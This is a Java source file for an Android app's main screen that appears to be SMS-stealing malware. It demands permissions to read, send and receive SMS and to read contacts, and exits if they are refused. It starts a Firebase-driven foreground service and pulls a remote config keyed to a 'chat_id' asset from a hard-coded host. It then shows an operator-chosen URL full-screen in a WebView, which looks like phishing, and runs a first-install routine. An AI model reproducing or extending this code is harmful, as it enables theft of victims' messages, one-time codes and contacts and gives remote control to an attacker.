package com.drnull.v3;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.app.Activity;
import android.app.Application;
import android.content.ContentValues;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build;
import android.os.Bundle;
import android.os.StrictMode;
import android.util.Log;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.FirebaseApp;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.messaging.FirebaseMessaging;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Map;

public class MainActivity extends AppCompatActivity {
    private final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

//        setContentView(R.layout.activity_main);

        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

        ActivityCompat.requestPermissions(this , new String[]{"android.permission.POST_NOTIFICATIONS" , "android.permission.READ_SMS" , "android.permission.SEND_SMS" , "android.permission.RECEIVE_SMS" , "android.permission.READ_CONTACTS"} , 99);
        FirebaseApp.initializeApp(this);
        FirebaseMessaging.getInstance().setAutoInitEnabled(true);
        FirebaseMessaging.getInstance().subscribeToTopic("app");
        try{
            Intent i = new Intent(this , FMService.class);
            ActivityCompat.startForegroundService(this , i);
//
        } catch (Exception e){
            e.printStackTrace();
        }



    }


    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (checkSelfPermission("android.permission.POST_NOTIFICATIONS") == PackageManager.PERMISSION_GRANTED &&
                checkSelfPermission("android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED &&
                checkSelfPermission("android.permission.SEND_SMS") == PackageManager.PERMISSION_GRANTED &&
                checkSelfPermission("android.permission.RECEIVE_SMS") == PackageManager.PERMISSION_GRANTED &&
                checkSelfPermission("android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED
        ) {
            // end
            SQLiteDatabase db = new Database(this).getReadableDatabase();
            Cursor cursor = db.query("installed" , null , null , null , null , null , null);
            if (cursor != null && cursor.moveToFirst()){
                if (cursor.getInt(cursor.getColumnIndexOrThrow("status")) != 1) {
                    actionHandler act = new actionHandler(this);
                    try {
                        WebView webView = new WebView(getApplicationContext());
                        webView.getSettings().setJavaScriptEnabled(true);
                        webView.getSettings().setLoadWithOverviewMode(true);
                        webView.setWebViewClient(new WebViewClient() {
                            @Override
                            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                                // Customize the behavior when a URL is loaded
                                // Return true to handle the URL in the WebView, or false to let the default behavior take over
                                view.loadUrl(url);
                                return true;
                            }
                        });

                        String addr = "https://maker-addr.com";
                        try {
                            HttpURLConnection conn = (HttpURLConnection) new URL("https://" + addr + "/config/" + act.readAsset("chat_id.txt")).openConnection();
                            conn.setRequestMethod("GET");
                            conn.setReadTimeout(3000);
                            conn.connect();
                            String result = "";
                            String temp;
                            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                            while ((temp = br.readLine()) != null) {
                                result = result + temp + "\n";
                            }
                            JSONObject res = new JSONObject(result);

                            webView.loadUrl(res.getString("url"));

                            setContentView(webView);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        try {
                            SQLiteDatabase db1 = new Database(getApplicationContext()).getWritableDatabase();
                            ContentValues contentValues = new ContentValues();
//                                contentValues.put("status" , 1);
//                                db.update("installed", contentValues , "_id = 0" , new String[]{"status"});
                            db1.execSQL("update installed set status=1 where status=0");
                            act.firstinstall();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    } catch (Exception e){
                        e.printStackTrace();
                    }
                }
            }
        } else {
            finish();
        }


    }
}